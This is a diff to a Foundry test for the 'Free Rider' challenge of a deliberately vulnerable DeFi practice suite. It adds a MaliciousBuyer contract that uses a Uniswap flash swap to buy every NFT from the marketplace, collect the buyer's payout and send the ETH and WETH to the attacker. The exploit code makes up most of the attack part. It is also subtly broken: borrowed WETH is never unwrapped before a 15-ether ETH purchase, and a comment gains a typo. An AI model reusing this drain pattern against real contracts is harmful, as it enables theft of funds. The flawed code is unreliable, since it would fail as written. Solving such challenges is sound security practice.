@@ -91,9 +91,7 @@ contract FreeRider is Test {
         assertEq(uniswapV2Pair.token1(), address(weth));
         assertGt(uniswapV2Pair.balanceOf(deployer), 0);
 
-        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
-            value: MARKETPLACE_INITIAL_ETH_BALANCE
-        }(AMOUNT_OF_NFTS);
+        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);
 
         damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());
 
@@ -120,23 +118,29 @@ contract FreeRider is Test {
 
         vm.startPrank(buyer);
 
-        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
-            attacker,
-            address(damnValuableNFT)
-        );
+        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(attacker, address(damnValuableNFT));
 
         vm.stopPrank();
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitFreeRider() public {
         /**
          * EXPLOIT START *
          */
-        vm.startPrank(attacker, attacker);
+        vm.startPrank(attacker);
 
+        // Deploy the malicious contract
+        MaliciousBuyer maliciousBuyer = new MaliciousBuyer(
+            freeRiderNFTMarketplace, damnValuableNFT, weth, uniswapV2Pair, freeRiderBuyer, uniswapV2Router, attacker
+        );
+
+        // Execute the attack
+        maliciousBuyer.attack{value: 0.5 ether}();
         vm.stopPrank();
+
+     
         /**
          * EXPLOIT END *
          */
@@ -153,7 +157,7 @@ contract FreeRider is Test {
         assertGt(attacker.balance, BUYER_PAYOUT);
         assertEq(address(freeRiderBuyer).balance, 0);
 
-        // The buyer extracts all NFTs from its associated contract
+        // The buyer extracts all NFTs from its associated contfract
         vm.startPrank(buyer);
         for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
             damnValuableNFT.transferFrom(address(freeRiderBuyer), buyer, tokenId);
@@ -164,5 +168,82 @@ contract FreeRider is Test {
         // Exchange must have lost NFTs and ETH
         assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
         assertLt(address(freeRiderNFTMarketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
+    }
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+contract MaliciousBuyer {
+    FreeRiderNFTMarketplace marketplace;
+    DamnValuableNFT nft;
+    WETH9 weth;
+    IUniswapV2Pair uniswapPair;
+    FreeRiderBuyer buyer;
+    IUniswapV2Router02 router;
+    address payable attacker;
+
+    constructor(
+        FreeRiderNFTMarketplace _marketplace,
+        DamnValuableNFT _nft,
+        WETH9 _weth,
+        IUniswapV2Pair _uniswapPair,
+        FreeRiderBuyer _buyer,
+        IUniswapV2Router02 _router,
+        address payable _attacker
+    ) {
+        marketplace = _marketplace;
+        nft = _nft;
+        weth = _weth;
+        uniswapPair = _uniswapPair;
+        buyer = _buyer;
+        router = _router;
+        attacker = _attacker;
+    }
+
+    function attack() external payable {
+        // Step 1: Swap some ETH for WETH
+        weth.deposit{value: 0.4 ether}();
+
+        // Step 2: Flash swap to borrow remaining WETH
+        bytes memory data = abi.encode(weth, marketplace);
+        uniswapPair.swap(14.6 ether, 0, address(this), data);
+
+        // Transfer remaining ETH and WETH to attacker
+        attacker.transfer(address(this).balance);
+        weth.transfer(attacker, weth.balanceOf(address(this)));
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        require(msg.sender == address(uniswapPair), "Not authorized");
+        require(sender == address(this), "Not authorized");
+
+        (WETH9 _weth, FreeRiderNFTMarketplace _marketplace) = abi.decode(data, (WETH9, FreeRiderNFTMarketplace));
+
+        // Step 3: Buy all NFTs from the marketplace
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+        _marketplace.buyMany{value: 15 ether}(tokenIds);
+
+        // Step 4: Transfer NFTs to the buyer
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), address(buyer), i);
+        }
+
+        // Step 5: Repay the flash loan
+        uint256 fee = ((amount0 * 3) / 997) + 1;
+        uint256 amountToRepay = amount0 + fee;
+        _weth.transfer(address(uniswapPair), amountToRepay);
+    }
+
+    // To receive ETH
+    receive() external payable {}
+
+    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
     }
 }
